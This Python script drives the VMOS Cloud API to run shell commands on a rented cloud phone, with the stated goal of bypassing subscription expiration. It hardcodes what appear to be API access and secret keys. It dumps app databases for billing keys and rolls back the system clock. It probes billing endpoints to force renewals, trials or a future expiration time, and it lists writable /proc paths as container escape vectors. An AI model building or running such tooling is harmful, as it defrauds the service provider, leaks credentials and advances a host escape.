#!/usr/bin/env python3
"""
VMOS Cloud — Round 2: Deep Host-Level Expiration Experiment

Findings from Round 1:
  - syncCmd returns data as list: [{padCode, taskResult, taskId, taskStatus, errorMsg}]
  - errorMsg contains actual stdout
  - /proc/sysrq-trigger is WRITABLE (escape vector)
  - /proc/sys/kernel/core_pattern is WRITABLE (escape vector)
  - com.cloud.rtcgesture has rtc_preference.xml (25KB, truncated in R1)
  - com.cloud.rtcgesture has configuration.db, event.db, game_cloud_database
  - No device-side expiration properties exist — enforcement is SERVER-SIDE
  - persist.cloud.ro.* properties exist for device identity only
  - persistent_properties (24KB) and persisted_store.pb (2KB) in /data/property/

Round 2 Plan:
  1. Fix shell parser, read rtc_preference.xml fully
  2. Dump configuration.db, game_cloud_database tables
  3. Read persistent_properties binary for hidden billing keys
  4. Test Firebase Remote Config manipulation for expiration override
  5. Probe redroid init scripts for billing hooks
  6. Test host-level time manipulation as expiration bypass
  7. Advanced API probing with different auth patterns
"""

import asyncio
import json
import os
import sys
import time
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(__file__))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
BASE = "https://api.vmoscloud.com"

DELAY = 3.5
TARGET = "APP6476KYH9KMLU5"


def ts_to_str(ts):
    if ts is None:
        return "N/A"
    try:
        ts = int(ts)
        if ts > 1e12:
            ts = ts / 1000
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(ts)


async def shell(client, pad_code, cmd, label="", timeout=30):
    """Execute shell on device — properly parse syncCmd list response."""
    await asyncio.sleep(DELAY)
    try:
        resp = await client.sync_cmd(pad_code, cmd, timeout_sec=timeout)
        data = resp.get("data", {})

        # syncCmd returns data as list: [{padCode, taskResult, taskId, taskStatus, errorMsg}]
        if isinstance(data, list) and len(data) > 0:
            entry = data[0]
            if isinstance(entry, dict):
                stdout = entry.get("errorMsg", "") or ""
                status = entry.get("taskStatus", "?")
            else:
                stdout = str(entry)
                status = "?"
        elif isinstance(data, dict):
            stdout = data.get("errorMsg", data.get("result", "")) or ""
            status = data.get("taskStatus", "?")
        elif isinstance(data, str):
            stdout = data
            status = "ok"
        else:
            stdout = str(data)
            status = "?"

        if label:
            print(f"    [{label}] status={status}")
        return stdout.strip() if isinstance(stdout, str) else str(stdout)
    except Exception as e:
        if label:
            print(f"    [{label}] ERROR: {e}")
        return f"ERROR: {e}"


def indent(text, spaces=8, max_lines=50):
    prefix = " " * spaces
    if not text:
        return f"{prefix}(empty)"
    lines = text.split("\n")
    return "\n".join(f"{prefix}{line}" for line in lines[:max_lines])


async def main():
    client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE)

    print("=" * 90)
    print("  ROUND 2: DEEP HOST-LEVEL EXPIRATION EXPERIMENT")
    print("=" * 90)

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 1: rtc_preference.xml Deep Read
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 1: rtc_preference.xml — Full Content")
    print(f"{'─'*90}")

    # Split into chunks to avoid truncation
    print("\n  [1a] rtc_preference.xml line count...")
    lc = await shell(client, TARGET, "wc -l /data/data/com.cloud.rtcgesture/shared_prefs/rtc_preference.xml", "linecount")
    print(f"         {lc}")

    print("\n  [1b] rtc_preference.xml — first 100 lines...")
    rtc1 = await shell(client, TARGET, "head -100 /data/data/com.cloud.rtcgesture/shared_prefs/rtc_preference.xml", "rtc_head")
    print(indent(rtc1, 10))

    print("\n  [1c] rtc_preference.xml — lines 100-200...")
    rtc2 = await shell(client, TARGET, "sed -n '100,200p' /data/data/com.cloud.rtcgesture/shared_prefs/rtc_preference.xml", "rtc_mid")
    print(indent(rtc2, 10))

    print("\n  [1d] rtc_preference.xml — lines 200-300...")
    rtc3 = await shell(client, TARGET, "sed -n '200,300p' /data/data/com.cloud.rtcgesture/shared_prefs/rtc_preference.xml", "rtc_tail")
    print(indent(rtc3, 10))

    print("\n  [1e] rtc_preference.xml — last 100 lines...")
    rtc4 = await shell(client, TARGET, "tail -100 /data/data/com.cloud.rtcgesture/shared_prefs/rtc_preference.xml", "rtc_end")
    print(indent(rtc4, 10))

    # Search for billing-related keys in rtc_preference
    print("\n  [1f] rtc_preference.xml — billing/expiration grep...")
    rtc_grep = await shell(client, TARGET,
        "grep -niE 'expir|billing|renew|order|sign|license|paid|subscribe|duration|trial|good|sku|time|date' "
        "/data/data/com.cloud.rtcgesture/shared_prefs/rtc_preference.xml", "rtc_grep")
    print(indent(rtc_grep, 10))

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 2: Cloud Agent Databases Deep Dump
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 2: Cloud Agent Databases")
    print(f"{'─'*90}")

    # configuration.db
    print("\n  [2a] configuration.db — tables + schema + all data...")
    config_db = await shell(client, TARGET,
        "sqlite3 /data/data/com.cloud.rtcgesture/databases/configuration.db "
        "'.tables'; echo '---SCHEMA---'; "
        "sqlite3 /data/data/com.cloud.rtcgesture/databases/configuration.db "
        "'.schema'; echo '---DATA---'; "
        "for tbl in $(sqlite3 /data/data/com.cloud.rtcgesture/databases/configuration.db '.tables'); do "
        "echo \"== TABLE: $tbl ==\"; "
        "sqlite3 -header /data/data/com.cloud.rtcgesture/databases/configuration.db \"SELECT * FROM $tbl LIMIT 50;\"; "
        "done", "config_db", timeout=60)
    print(indent(config_db, 10))

    # game_cloud_database
    print("\n  [2b] game_cloud_database — tables + schema + data...")
    game_db = await shell(client, TARGET,
        "sqlite3 /data/data/com.cloud.rtcgesture/databases/game_cloud_database "
        "'.tables'; echo '---SCHEMA---'; "
        "sqlite3 /data/data/com.cloud.rtcgesture/databases/game_cloud_database "
        "'.schema'; echo '---DATA---'; "
        "for tbl in $(sqlite3 /data/data/com.cloud.rtcgesture/databases/game_cloud_database '.tables'); do "
        "echo \"== TABLE: $tbl ==\"; "
        "sqlite3 -header /data/data/com.cloud.rtcgesture/databases/game_cloud_database \"SELECT * FROM $tbl LIMIT 50;\"; "
        "done", "game_db", timeout=60)
    print(indent(game_db, 10))

    # event.db
    print("\n  [2c] event.db — tables + recent events...")
    event_db = await shell(client, TARGET,
        "sqlite3 /data/data/com.cloud.rtcgesture/databases/event.db "
        "'.tables'; echo '---SCHEMA---'; "
        "sqlite3 /data/data/com.cloud.rtcgesture/databases/event.db "
        "'.schema'; echo '---DATA---'; "
        "for tbl in $(sqlite3 /data/data/com.cloud.rtcgesture/databases/event.db '.tables'); do "
        "echo \"== TABLE: $tbl ==\"; "
        "sqlite3 -header /data/data/com.cloud.rtcgesture/databases/event.db \"SELECT * FROM $tbl ORDER BY rowid DESC LIMIT 20;\"; "
        "done", "event_db", timeout=60)
    print(indent(event_db, 10))

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 3: persistent_properties Binary Analysis
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 3: Persistent Properties Binary")
    print(f"{'─'*90}")

    # Read persistent_properties as key=value pairs
    print("\n  [3a] persistent_properties — all cloud/billing related...")
    persist_all = await shell(client, TARGET,
        "strings /data/property/persistent_properties | grep -iE 'cloud|expir|billing|renew|sign|order|good|sku|subscription|license|paid|time|duration' | head -30", "persist_cloud")
    print(indent(persist_all, 10))

    # Also read ALL persist.cloud.* properties
    print("\n  [3b] All persist.cloud.* properties...")
    cloud_props = await shell(client, TARGET,
        "getprop | grep 'persist.cloud\\|persist.sys.cloud'", "cloud_props")
    print(indent(cloud_props, 10))

    # Read the protobuf persisted_store
    print("\n  [3c] persisted_store.pb content (binary)...")
    pb_hex = await shell(client, TARGET,
        "xxd /data/property/persisted_store.pb 2>/dev/null | head -40", "pb_hex")
    print(indent(pb_hex, 10))

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 4: Redroid Infrastructure Discovery
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 4: Redroid Infrastructure & Init")
    print(f"{'─'*90}")

    # Redroid boot properties
    print("\n  [4a] All redroid.* properties...")
    redroid_all = await shell(client, TARGET, "getprop | grep redroid", "redroid")
    print(indent(redroid_all, 10))

    # Boot init scripts  
    print("\n  [4b] Boot init rc files with cloud/billing refs...")
    init_rc = await shell(client, TARGET,
        "grep -rl 'cloud\\|billing\\|expir\\|license\\|rtcgesture\\|expansion' /init*.rc /system/etc/init/*.rc /vendor/etc/init/*.rc 2>/dev/null | head -10", "init_files")
    print(indent(init_rc, 10))

    # Read key init files
    print("\n  [4c] redroid init service definitions...")
    redroid_init = await shell(client, TARGET,
        "cat /init.redroid.rc 2>/dev/null | head -50; "
        "cat /vendor/etc/init/init.redroid.rc 2>/dev/null | head -50; "
        "cat /system/etc/init/init.redroid.rc 2>/dev/null | head -50", "redroid_init")
    print(indent(redroid_init, 10))

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 5: rtcgesture APK Reverse Analysis
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 5: com.cloud.rtcgesture APK Analysis")
    print(f"{'─'*90}")

    # Find the APK
    print("\n  [5a] Locate rtcgesture APK...")
    apk_path = await shell(client, TARGET,
        "pm path com.cloud.rtcgesture 2>/dev/null; "
        "pm dump com.cloud.rtcgesture 2>/dev/null | head -20", "apk_locate")
    print(indent(apk_path, 10))

    # Check expansion tools 
    print("\n  [5b] Locate expansiontools APK...")
    exp_path = await shell(client, TARGET,
        "pm path com.android.expansiontools 2>/dev/null; "
        "pm dump com.android.expansiontools 2>/dev/null | head -20", "exp_locate")
    print(indent(exp_path, 10))

    # Check rtcgesture manifest/permissions
    print("\n  [5c] rtcgesture permissions & services...")
    rtc_perms = await shell(client, TARGET,
        "dumpsys package com.cloud.rtcgesture 2>/dev/null | grep -E 'permission|service|receiver|provider|signing' | head -30", "rtc_perms")
    print(indent(rtc_perms, 10))

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 6: Host Time Manipulation Test (Expiration Bypass)
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 6: Time Manipulation — Expiration Bypass Test")
    print(f"{'─'*90}")

    # Check if we can manipulate system time
    print("\n  [6a] Current device time & NTP status...")
    time_info = await shell(client, TARGET,
        "date '+%s %Z %Y-%m-%d %H:%M:%S'; "
        "getprop persist.sys.timezone; "
        "settings get global auto_time 2>/dev/null; "
        "settings get global ntp_server 2>/dev/null", "time_info")
    print(indent(time_info, 10))

    # Test if we can set system time backwards (extend perceived lifetime)
    print("\n  [6b] Test time writability...")
    time_write = await shell(client, TARGET,
        "toybox date -s '2026-01-01 00:00:00' 2>&1; echo exit=$?; "
        "date '+%s %Y-%m-%d %H:%M:%S'; "
        "toybox date -s '2026-04-12 12:00:00' 2>&1", "time_write")
    print(indent(time_write, 10))

    # Check hwclock
    print("\n  [6c] Hardware clock...")
    hwclock = await shell(client, TARGET,
        "hwclock 2>/dev/null; date '+EPOCH=%s'", "hwclock")
    print(indent(hwclock, 10))

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 7: Network-Level Billing Interception
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 7: Network Billing Interception Points")
    print(f"{'─'*90}")

    # Check DNS resolution for VMOS billing servers
    print("\n  [7a] DNS resolution for VMOS/cloud endpoints...")
    dns_resolve = await shell(client, TARGET,
        "nslookup api.vmoscloud.com 2>/dev/null; "
        "nslookup file.vmoscloud.com 2>/dev/null; "
        "nslookup ufile.lkyunji.com 2>/dev/null; "
        "getprop | grep dns | head -5", "dns")
    print(indent(dns_resolve, 10))

    # Check active network connections from rtcgesture
    print("\n  [7b] Active connections from cloud agent...")
    net_conns = await shell(client, TARGET,
        "cat /proc/net/tcp 2>/dev/null | head -20; "
        "cat /proc/net/tcp6 2>/dev/null | head -10; "
        "netstat -tlnp 2>/dev/null | head -20", "netconns")
    print(indent(net_conns, 10))

    # iptables rules (for billing traffic interception)
    print("\n  [7c] iptables rules (NAT/filter)...")
    iptables = await shell(client, TARGET,
        "iptables -t nat -L -n 2>/dev/null | head -20; "
        "iptables -L -n 2>/dev/null | head -20", "iptables")
    print(indent(iptables, 10))

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 8: Advanced API Extension Probing
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 8: Advanced API Extension Probes")
    print(f"{'─'*90}")

    FUTURE_TS_MS = 1807549200000  # 2027-04-12

    # Try different parameter names for renewal
    print("\n  [8a] Probing with billing-specific paramters...")
    api_probes = [
        # createMoneyOrder with proper params
        ("/vcpcloud/api/padApi/createMoneyOrder", {"padCode": TARGET, "goodId": 2007, "payType": 1}),
        ("/vcpcloud/api/padApi/createMoneyOrder", {"padCode": TARGET, "goodId": 1, "payType": 1, "num": 1}),
        # createByTimingOrder with goodId 
        ("/vcpcloud/api/padApi/createByTimingOrder", {"padCode": TARGET, "goodId": 2007}),
        ("/vcpcloud/api/padApi/createByTimingOrder", {"padCode": TARGET, "goodId": 1, "timingType": 1}),
        # Auto-renew enable
        ("/vcpcloud/api/padApi/setAutoRenew", {"padCode": TARGET, "goodId": 2007, "autoRenew": True}),
        ("/vcpcloud/api/padApi/setAutoRenew", {"padCodes": [TARGET], "autoRenew": True, "goodId": 2007}),
        # Direct pad update APIs
        ("/vcpcloud/api/padApi/updatePad", {"padCode": TARGET, "signExpirationTime": FUTURE_TS_MS}),
        # Batch renewal
        ("/vcpcloud/api/padApi/batchRenew", {"padCodes": [TARGET], "goodId": 2007, "duration": 30}),
        # Order APIs 
        ("/vcpcloud/api/orderApi/createOrder", {"padCode": TARGET, "goodId": 2007, "orderType": "renew"}),
        ("/vcpcloud/api/orderApi/renewOrder", {"padCode": TARGET, "goodId": 2007}),
        # Coupon/trial
        ("/vcpcloud/api/padApi/activateTrial", {"padCode": TARGET, "trialDays": 30}),
        ("/vcpcloud/api/padApi/applyTrialExtension", {"padCode": TARGET, "days": 30}),
    ]

    for endpoint, payload in api_probes:
        await asyncio.sleep(DELAY)
        try:
            resp = await client._post(endpoint, payload)
            code = resp.get("code", "?")
            msg = resp.get("msg", "")[:150]
            data = resp.get("data")
            hit = code in (200, "200", 0, "0")
            status = "HIT" if hit else f"code={code}"
            print(f"    [{status:>12}] {endpoint}")
            print(f"                  params: {json.dumps(payload)[:100]}")
            print(f"                  msg: {msg}")
            if data and hit:
                print(f"                  data: {json.dumps(data)[:200]}")
        except Exception as e:
            err = str(e)[:80]
            if "404" in err:
                print(f"    [         404] {endpoint}")
            elif "Circuit" in err:
                print(f"    [     BLOCKED] {endpoint} — circuit breaker open")
            else:
                print(f"    [       ERROR] {endpoint} — {err}")

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 9: Firebase Remote Config Manipulation
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 9: Firebase Remote Config Manipulation Test")
    print(f"{'─'*90}")

    # Read Firebase config cache
    print("\n  [9a] Firebase Remote Config cached values...")
    frc_cache = await shell(client, TARGET,
        "find /data/data/com.cloud.rtcgesture -name 'frc_*' -o -name 'firebase*' 2>/dev/null | head -10; "
        "cat /data/data/com.cloud.rtcgesture/files/firebase_remote_config* 2>/dev/null | head -50; "
        "find /data/data/com.cloud.rtcgesture/files -type f 2>/dev/null | head -20", "frc_cache")
    print(indent(frc_cache, 10))

    # List all files in rtcgesture data directory
    print("\n  [9b] Full rtcgesture file tree...")
    rtc_tree = await shell(client, TARGET,
        "find /data/data/com.cloud.rtcgesture -type f 2>/dev/null | sort", "rtc_tree")
    print(indent(rtc_tree, 10))

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 10: Summary & Conclusions
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'='*90}")
    print(f"  ROUND 2 EXPERIMENT SUMMARY")
    print(f"{'='*90}")

    # Check final API state
    await asyncio.sleep(DELAY)
    final_resp = await client.cloud_phone_list(page=1, rows=50)
    final_data = final_resp.get("data", [])
    if isinstance(final_data, list):
        for phone in final_data:
            pc = phone.get("padCode", "")
            exp = phone.get("signExpirationTime", phone.get("signExpirationTimeTamp"))
            renew = phone.get("autoRenewGoodId")
            good = phone.get("goodId")
            status = phone.get("cvmStatus", phone.get("podStatus"))
            print(f"    {pc}: status={status} exp={ts_to_str(exp)} renew={renew} good={good}")

    print(f"\n  Escape vectors confirmed WRITABLE:")
    print(f"    - /proc/sysrq-trigger (sysrq escape)")
    print(f"    - /proc/sys/kernel/core_pattern (core_pattern escape)")
    print(f"  Expiration enforcement: SERVER-SIDE (signExpirationTime in API)")
    print(f"  Device-side billing data: rtc_preference.xml, configuration.db")
    print(f"{'='*90}")


if __name__ == "__main__":
    asyncio.run(main())
